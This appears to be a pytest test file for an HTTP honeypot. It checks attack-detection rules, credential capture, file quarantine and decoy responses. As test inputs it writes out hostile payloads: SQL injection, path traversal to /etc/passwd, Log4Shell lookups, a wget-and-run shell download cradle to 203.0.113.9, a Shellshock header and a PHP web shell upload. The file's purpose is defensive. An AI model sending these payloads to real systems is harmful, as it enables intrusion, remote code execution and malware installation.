from __future__ import annotations

import asyncio
import hashlib

import pytest

from honeynet.services.http_rules import extract_payload_urls, match_rules
from conftest import read_events, running


async def http(port: int, raw: bytes, *, read_all=True) -> bytes:
    reader, writer = await asyncio.open_connection("127.0.0.1", port)
    writer.write(raw)
    await writer.drain()
    out = b""
    try:
        while True:
            chunk = await asyncio.wait_for(reader.read(65536), 3)
            if not chunk:
                break
            out += chunk
            if not read_all:
                break
    except asyncio.TimeoutError:
        pass
    writer.close()
    return out


def req(method, path, headers=None, body=b""):
    h = {"Host": "victim.example", "User-Agent": "test-agent/1.0", "Connection": "close", **(headers or {})}
    if body:
        h["Content-Length"] = str(len(body))
    return (f"{method} {path} HTTP/1.1\r\n" + "".join(f"{k}: {v}\r\n" for k, v in h.items()) + "\r\n").encode() + body


def events(settings, name):
    return [e for e in read_events(settings, "http") if e["event"] == name]


# ----------------------------------------------------------------- rules (unit)

@pytest.mark.parametrize("uri,expected", [
    ("/index.php?id=1' OR '1'='1", "sqli-boolean"),
    ("/p?id=1 UNION SELECT user,password FROM users--", "sqli-union"),
    ("/p?id=1;SELECT%20SLEEP(5)", "sqli-time-based"),
    ("/../../../../etc/passwd", "path-traversal"),
    ("/%2e%2e/%2e%2e/etc/passwd", "path-traversal"),
    ("/cgi-bin/.%2e/.%2e/.%2e/bin/sh", "apache-path-traversal"),
    ("/?q=<script>alert(1)</script>", "xss-probe"),
    ("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "phpunit-eval-stdin"),
    ("/GponForm/diag_Form?images/", "gpon-router-rce"),
    ("/.env", "dotenv-probe"),
    ("/cgi-bin/luci/;stok=/locale?form=country", "tplink-luci-locale"),
    ("/?x=${jndi:ldap://203.0.113.9/a}", "log4shell"),
    ("/shell?cd+/tmp;wget+http://203.0.113.9/a.sh;sh+a.sh", "shell-download-cradle"),
])
def test_rule_matching(uri, expected):
    names = {m["rule"] for m in match_rules(uri, "Host: x\nUser-Agent: curl/7", "")}
    assert expected in names, names


def test_rules_header_and_body_targets_and_benign_traffic():
    names = {m["rule"] for m in match_rules("/", "User-Agent: () { :;}; /bin/bash -c 'id'", "")}
    assert "shellshock" in names
    names = {m["rule"] for m in match_rules("/", "User-Agent: sqlmap/1.5", "")}
    assert "scanner-user-agent" in names
    names = {m["rule"] for m in match_rules("/login", "Content-Type: application/x-www-form-urlencoded", "a=${jndi:ldap://x/y}")}
    assert "log4shell" in names
    benign = match_rules("/products/shoes?color=red&page=2", "Host: shop.example\nUser-Agent: Mozilla/5.0 (X11; Linux)", "")
    assert benign == []


def test_cve_metadata_present():
    m = next(x for x in match_rules("/?x=${jndi:ldap://a/b}", "", "") if x["rule"] == "log4shell")
    assert m["cve"] == "CVE-2021-44228" and m["category"] == "rce" and m["severity"] == 3


def test_extract_payload_urls():
    urls = extract_payload_urls("/cgi-bin/x?cmd=wget%20http://203.0.113.9:81/bins/mips%20-O%20/tmp/m;sh", "")
    assert "http://203.0.113.9:81/bins/mips" in urls


# ------------------------------------------------------------------ integration

async def test_default_page_and_request_logging(settings):
    async with running(settings, "http") as (svc, port):
        resp = await http(port, req("GET", "/"))
    assert resp.startswith(b"HTTP/1.1 200") and b"Apache2 Ubuntu Default Page" in resp
    assert b"Server: Apache/2.4.41 (Ubuntu)" in resp
    ev = events(settings, "http.request")[0]
    assert ev["data"]["method"] == "GET" and ev["data"]["user_agent"] == "test-agent/1.0"
    assert len(ev["data"]["header_fp"]) == 16


async def test_wordpress_login_captures_credentials_and_escapes_reflection(settings):
    body = b"log=%3Cscript%3Ealert(1)%3C%2Fscript%3E&pwd=hunter2&wp-submit=Log+In"
    async with running(settings, "http") as (svc, port):
        resp = await http(port, req("POST", "/wp-login.php", {"Content-Type": "application/x-www-form-urlencoded"}, body))
    assert b"<script>alert(1)</script>" not in resp          # reflected value must be escaped
    assert b"&lt;script&gt;" in resp
    a = events(settings, "auth.attempt")[0]["data"]
    assert a["password"] == "hunter2" and a["method"] == "http-form" and a["username"] == "<script>alert(1)</script>"


async def test_phpmyadmin_and_basic_auth_credentials(settings):
    async with running(settings, "http") as (svc, port):
        await http(port, req("POST", "/phpmyadmin/index.php", {"Content-Type": "application/x-www-form-urlencoded"},
                             b"pma_username=root&pma_password=toor&server=1"))
        resp = await http(port, req("GET", "/manager/html", {"Authorization": "Basic dG9tY2F0OnMzY3JldA=="}))
    assert resp.startswith(b"HTTP/1.1 401") and b"WWW-Authenticate: Basic" in resp
    creds = [(e["data"]["username"], e["data"]["password"], e["data"]["method"]) for e in events(settings, "auth.attempt")]
    assert ("root", "toor", "http-form") in creds and ("tomcat", "s3cret", "http-basic") in creds


async def test_exploit_events_and_plausible_responses(settings):
    async with running(settings, "http") as (svc, port):
        r1 = await http(port, req("GET", "/../../../../etc/passwd"))
        r2 = await http(port, req("GET", "/cgi-bin/test?cmd=id;wget+http://203.0.113.9/x.sh"))
        await http(port, req("GET", "/search?q=1'+UNION+SELECT+1,2,3--"))
    assert b"root:x:0:0" in r1 and b"uid=33(www-data)" in r2
    rules = {e["data"]["rule"] for e in events(settings, "exploit.attempt")}
    assert {"path-traversal", "lfi-sensitive-file", "command-injection", "sqli-union"} <= rules
    dl = events(settings, "download.attempt")
    assert dl and dl[0]["data"]["url"].startswith("http://203.0.113.9/x.sh")


async def test_upload_and_raw_payload_capture(settings):
    elf = b"\x7fELF\x02\x01\x01" + b"\x00" * 60
    boundary = "----x1"
    mp = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n"
          f"Content-Type: application/x-php\r\n\r\n").encode() + b"<?php system($_GET['c']); ?>\r\n" + f"--{boundary}--\r\n".encode()
    async with running(settings, "http") as (svc, port):
        await http(port, req("POST", "/upload.php", {"Content-Type": f"multipart/form-data; boundary={boundary}"}, mp))
        await http(port, req("PUT", "/x/bot.bin", {"Content-Type": "application/octet-stream"}, elf))
    caps = events(settings, "file.captured")
    shas = {c["data"]["sha256"] for c in caps}
    assert hashlib.sha256(elf).hexdigest() in shas
    assert hashlib.sha256(b"<?php system($_GET['c']); ?>").hexdigest() in shas
    assert all((settings.quarantine_dir / s[:2] / s).exists() for s in shas)


async def test_garbage_and_tls_clienthello_become_probes(settings):
    async with running(settings, "http") as (svc, port):
        await http(port, b"\x16\x03\x01\x02\x00\x01\x00\x01\xfc\x03\x03" + b"A" * 40 + b"\r\n\r\n")
        await http(port, b"SSH-2.0-libssh_0.9\r\n\r\n")
    probes = events(settings, "probe")
    assert {p["data"]["proto_guess"] for p in probes} >= {"tls-clienthello", "ssh-banner"}


async def test_oversized_headers_and_body_are_bounded(settings):
    settings.max_http_body = 2048
    async with running(settings, "http") as (svc, port):
        resp = await http(port, b"GET / HTTP/1.1\r\nHost: x\r\nX-Big: " + b"A" * 40000 + b"\r\n\r\n")
        assert b"431" in resp.split(b"\r\n", 1)[0]
        await http(port, req("POST", "/big", {"Content-Type": "text/plain"}, b"B" * 100000)[:20000])
    big = [e for e in events(settings, "http.request") if e["data"]["path"] == "/big"]
    assert big and big[0]["data"]["body_len"] <= 2048
    assert len(big[0]["data"]["body"]) <= 2100


async def test_keepalive_pipelining(settings):
    async with running(settings, "http") as (svc, port):
        raw = req("GET", "/robots.txt", {"Connection": "keep-alive"}) + req("GET", "/nope-xyz")
        resp = await http(port, raw)
    assert resp.count(b"HTTP/1.1 ") == 2 and b"404" in resp
